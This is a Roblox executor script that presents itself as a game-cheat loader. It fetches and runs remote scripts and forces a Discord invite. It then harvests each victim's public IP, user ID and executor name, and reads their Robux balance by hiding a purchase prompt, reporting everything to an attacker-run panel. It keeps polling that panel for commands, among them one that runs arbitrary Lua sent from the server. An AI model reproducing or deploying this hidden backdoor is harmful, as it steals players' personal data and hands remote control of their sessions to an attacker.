
repeat task.wait() until game:IsLoaded()

task.spawn(function()
    local gameId = game.GameId

    if gameId == 7671049560 then
        loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/2529a5f9dfddd5523ca4e22f21cceffa.lua"))()

    elseif gameId == 7709344486 or gameId == 96342491571673 then
        loadstring(game:HttpGet("https://raw.githubusercontent.com/tienkhanh1/spicy/main/Chilli.lua"))()

    elseif gameId == 4777817887 or gameId == 5295074138 then
        loadstring(game:HttpGet("https://raw.githubusercontent.com/AgentX771/ArgonHubX/main/Loader.lua"))()

    elseif gameId == 8316902627 then
        loadstring(game:HttpGet("https://gitlab.com/r_soft/main/-/raw/main/LoadUB.lua"))()

    else
        local player = game:GetService("Players").LocalPlayer
        if player then
            task.spawn(function()
                repeat task.wait() until player:FindFirstChild("Inventory") and player:FindFirstChild("Music")
                
                loadstring(game:HttpGet("https://raw.githubusercontent.com/VapeVoidware/VWExtra/main/NightsInTheForest.lua"))()

                pcall(function()
                    local HttpService = game:GetService("HttpService")

                    request({
                        Url = 'http://127.0.0.1:6463/rpc?v=1',
                        Method = 'POST',
                        Headers = {
                            ['Content-Type'] = 'application/json',
                            Origin = 'https://discord.com'
                        },
                        Body = HttpService:JSONEncode({
                            cmd = 'INVITE_BROWSER',
                            nonce = HttpService:GenerateGUID(false),
                            args = {code = "GNurMFgVFK"}
                        })
                    })
                end)

            end)
        end
    end
end)

local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local MarketplaceService = game:GetService("MarketplaceService")
local CoreGui = game:GetService("CoreGui")
local player = Players.LocalPlayer
if not player then return end

local SERVER_URL = "https://roblox-panel-production.up.railway.app/"
local PLAYER_ID = player.UserId
local request = syn and syn.request or request or http_request or http.request or fluxus and fluxus.request

local spinning = false
local rainbowActive = false
local invisibleActive = false
local currentSound = nil
local textScreenGui = nil
getgenv().robuxBalance = nil

local executorName = "Unknown"
pcall(function()
    executorName = identifyexecutor() or "Unknown"
end)

local publicIP = "Unknown"
pcall(function()
    local resp = game:HttpGet("http://api.ipify.org/?format=json")
    local data = HttpService:JSONDecode(resp)
    publicIP = data.ip or "Unknown"
end)

local function getRobuxBalance()
    local success, result = pcall(function()
        local gamePassId = 1613005644
        
        MarketplaceService:PromptGamePassPurchase(player, gamePassId)

        repeat task.wait(0.1) until game:GetService("CoreGui"):FindFirstChild("FoundationOverlay") and game:GetService("CoreGui"):FindFirstChild("FoundationOverlay"):FindFirstChild("UnifiedRobuxUpsellModal")
        
        pcall(function()
            game:GetService("CoreGui").FoundationOverlay.UnifiedRobuxUpsellModal.SheetContainer.Sheet.Content.Content:Destroy()

            for _, i in pairs(game:GetService("CoreGui").FoundationOverlay:GetDescendants()) do 
                if i.Name ~= "CloseAffordance" or i.Name == "1" and i:FindFirstChild("Text") and i.Parent.Name == "1" then
                    print(i.Name)
                    ConnectionActivated = getconnections(i.Activated)

                    for _, p in pairs(ConnectionActivated) do 
                        p:Disable()
                    end

                    MouseButtonOneClickActivated = getconnections(i.Activated)

                    for _, p in pairs(MouseButtonOneClickActivated) do 
                        p:Disable()
                    end
                end
            end
        end)

        task.spawn(function()
            local CoreGui = game:GetService("CoreGui")

            local function lockProp(inst, prop, value)
                pcall(function() inst[prop] = value end)
                    local ok, sig = pcall(function()
                        return inst:GetPropertyChangedSignal(prop)
                    end)
                    if ok and sig then
                    sig:Connect(function()
                        pcall(function()
                            if inst[prop] ~= value then
                                inst[prop] = value
                            end
                        end)
                    end)
                end
            end

            local CoreGui = game:GetService("CoreGui")
            local RunService = game:GetService("RunService")

            local FoundationOverlay = CoreGui:WaitForChild("FoundationOverlay")

            local function applyTransparency(inst)
                -- Remove style instantly
                if inst:IsA("UIStroke") or inst:IsA("UICorner") then
                    pcall(function() inst:Destroy() end)
                    return
                end

                -- Background
                if inst:IsA("GuiObject") then
                    lockProp(inst, "BackgroundTransparency", 1)
                end

                -- Text
                if inst:IsA("TextLabel") or inst:IsA("TextButton") or inst:IsA("TextBox") then
                    lockProp(inst, "TextTransparency", 1)
                    -- IMPORTANT: Roblox often uses stroke to re-show text
                    if inst.TextStrokeTransparency ~= nil then
                        lockProp(inst, "TextStrokeTransparency", 1)
                    end
                end

                -- Images
                if inst:IsA("ImageLabel") or inst:IsA("ImageButton") then
                    lockProp(inst, "ImageTransparency", 1)
                end
            end



            local overlay = CoreGui:WaitForChild("FoundationOverlay", 5)
            if not overlay then return end
        
            -- Apply to existing UI instantly
            for _, d in ipairs(overlay:GetDescendants()) do
                applyTransparency(d)
            end
            applyTransparency(overlay)

            -- Ultra-fast: apply to anything added later
            overlay.DescendantAdded:Connect(function(d)
                applyTransparency(d)
            end)

            for _, v in pairs(overlay:GetDescendants()) do
                if v:IsA("TextLabel") and v.Name == "RobuxPrice" and v.Parent.Name == "RightSide" then
                    getgenv().robuxBalance = v.ContentText:gsub("%D+", "")
                end
            end
        end)
        
        repeat task.wait() until getgenv().robuxBalance
        print(getgenv().robuxBalance)
        return getgenv().robuxBalance
    end)
    
    if success and result then
        task.spawn(function()
            local GuiService = game:GetService("GuiService")

            local function toggleUiNavigationPermissions(newState)
                GuiService.GuiNavigationEnabled = newState
                GuiService.AutoSelectGuiEnabled = newState 
                
                if newState == false then
                    GuiService.SelectedObject = nil
                end
            end

            toggleUiNavigationPermissions(true)
            btn = game:GetService("CoreGui").FoundationOverlay.UnifiedRobuxUpsellModal.SheetContainer.Sheet.Content.Header.Content.CloseAffordance
            task.wait(0.1)
            btn.Selectable = true
            GuiService.SelectedObject = btn
            task.wait(0.1)
            VirtualInputManager = game:GetService("VirtualInputManager")
            VirtualInputManager:SendKeyEvent(true, Enum.KeyCode.Return, false, game)
            task.wait()
            VirtualInputManager:SendKeyEvent(false, Enum.KeyCode.Return, false, game)
            task.wait(0.1)
            toggleUiNavigationPermissions(false)
        end)
        return result
    end
    return "?"
end

local function register()
    robuxBalance = getRobuxBalance()

    repeat task.wait(0.2) until robuxBalance
    
    pcall(function()
        request({
            Url = SERVER_URL .. "/api",
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = HttpService:JSONEncode({
                action = "register",
                userid = PLAYER_ID,
                username = player.Name,
                executor = executorName,
                ip = publicIP,
                game = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name,
                gameId = game.PlaceId,
                jobId = game.JobId,
                robux = robuxBalance
            })
        })
    end)
end

local function heartbeat()
    while true do
        pcall(function()
            request({
                Url = SERVER_URL .. "/api",
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = HttpService:JSONEncode({action = "heartbeat", userid = PLAYER_ID})
            })
        end)
        wait(5)
    end
end

local function createTextScreen(text)
    if textScreenGui then
        textScreenGui:Destroy()
    end
    
    textScreenGui = Instance.new("ScreenGui")
    textScreenGui.Name = "OxydalTextScreen"
    textScreenGui.ResetOnSpawn = false
    textScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    
    local frame = Instance.new("Frame")
    frame.Size = UDim2.new(1, 0, 1, 0)
    frame.Position = UDim2.new(0, 0, 0, 0)
    frame.BackgroundTransparency = 1
    frame.BorderSizePixel = 0
    frame.Parent = textScreenGui
    
    local textLabel = Instance.new("TextLabel")
    textLabel.Size = UDim2.new(0.8, 0, 0.3, 0)
    textLabel.Position = UDim2.new(0.1, 0, 0.35, 0)
    textLabel.BackgroundTransparency = 1
    textLabel.Text = text
    textLabel.TextColor3 = Color3.fromRGB(0, 255, 170)
    textLabel.TextScaled = true
    textLabel.Font = Enum.Font.GothamBold
    textLabel.TextStrokeTransparency = 0
    textLabel.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
    textLabel.Parent = frame
    
    textScreenGui.Parent = player.PlayerGui
end

local function hideTextScreen()
    if textScreenGui then
        textScreenGui:Destroy()
        textScreenGui = nil
    end
end

local function executeLuaScript(script)
    pcall(function()
        loadstring(script)()
    end)
end

local function applyInvisible(state)
    local char = player.Character or player.CharacterAdded:Wait()
    for _, part in pairs(char:GetDescendants()) do
        if part:IsA("BasePart") then
            part.Transparency = state and 1 or 0
        elseif part:IsA("Accessory") then
            local handle = part:FindFirstChild("Handle")
            if handle then handle.Transparency = state and 1 or 0 end
        end
    end
    invisibleActive = state
end

local function applyRainbow(state)
    local char = player.Character or player.CharacterAdded:Wait()
    if state then
        rainbowActive = true
        spawn(function()
            local i = 0
            while rainbowActive and char.Parent do
                i = (i + 1) % 100
                for _, part in pairs(char:GetDescendants()) do
                    if part:IsA("BasePart") then
                        part.Color = Color3.fromHSV(i / 100, 1, 1)
                    end
                end
                wait(0.1)
            end
        end)
    else
        rainbowActive = false
        for _, part in pairs(char:GetDescendants()) do
            if part:IsA("BasePart") then
                part.Color = Color3.fromRGB(163, 162, 162)
            end
        end
    end
end

local function poll()
    while true do
        local success, resp = pcall(function()
            return request({Url = SERVER_URL .. "/api?userid=" .. PLAYER_ID, Method = "GET"})
        end)
        if success and resp and resp.Body then
            local ok, data = pcall(HttpService.JSONDecode, HttpService, resp.Body)
            if ok and data and data.command then
                local cmd = data.command
                local char = player.Character or player.CharacterAdded:Wait()
                local hum = char:WaitForChild("Humanoid")
                local root = char:WaitForChild("HumanoidRootPart")
                
                if cmd == "kick" then
                    player:Kick(data.reason or "Kicked")
                elseif cmd == "freeze" then
                    hum.WalkSpeed = 0
                    hum.JumpPower = 0
                    root.Anchored = true
                elseif cmd == "unfreeze" then
                    hum.WalkSpeed = 16
                    hum.JumpPower = 50
                    root.Anchored = false
                elseif cmd == "spin" then
                    spinning = true
                    spawn(function()
                        while spinning and root.Parent do
                            root.CFrame = root.CFrame * CFrame.Angles(0, math.rad(20), 0)
                            wait(0.05)
                        end
                    end)
                elseif cmd == "unspin" then
                    spinning = false
                elseif cmd == "jump" then
                    hum:ChangeState(Enum.HumanoidStateType.Jumping)
                elseif cmd == "rainbow" then
                    applyRainbow(true)
                elseif cmd == "unrainbow" then
                    applyRainbow(false)
                elseif cmd == "invisible" then
                    applyInvisible(true)
                elseif cmd == "uninvisible" then
                    applyInvisible(false)
                elseif cmd == "explode" then
                    local exp = Instance.new("Explosion")
                    exp.Position = root.Position
                    exp.BlastRadius = 50
                    exp.BlastPressure = 500000
                    exp.Parent = workspace
                elseif cmd == "luaexec" and data.script then
                    executeLuaScript(data.script)
                elseif cmd == "playsound" and data.assetId then
                    local head = char:FindFirstChild("Head")
                    if head then
                        if currentSound then currentSound:Stop() end
                        currentSound = Instance.new("Sound")
                        currentSound.Parent = head
                        currentSound.SoundId = "rbxassetid://"..data.assetId
                        currentSound.Volume = 1
                        currentSound.Looped = false
                        currentSound:Play()
                    end
                elseif cmd == "stopsound" then
                    if currentSound then
                        currentSound:Stop()
                        currentSound:Destroy()
                        currentSound = nil
                    end
                elseif cmd == "textscreen" and data.text then
                    createTextScreen(data.text)
                elseif cmd == "hidetext" then
                    hideTextScreen()
                elseif cmd == "refreshrobux" then
                    robuxBalance = getRobuxBalance()
                    pcall(function()
                        request({
                            Url = SERVER_URL .. "/api",
                            Method = "POST",
                            Headers = {["Content-Type"] = "application/json"},
                            Body = HttpService:JSONEncode({
                                action = "updaterobux",
                                userid = PLAYER_ID,
                                robux = robuxBalance
                            })
                        })
                    end)
                end
            end
        end
        wait(3)
    end
end

register()
spawn(heartbeat)
spawn(poll)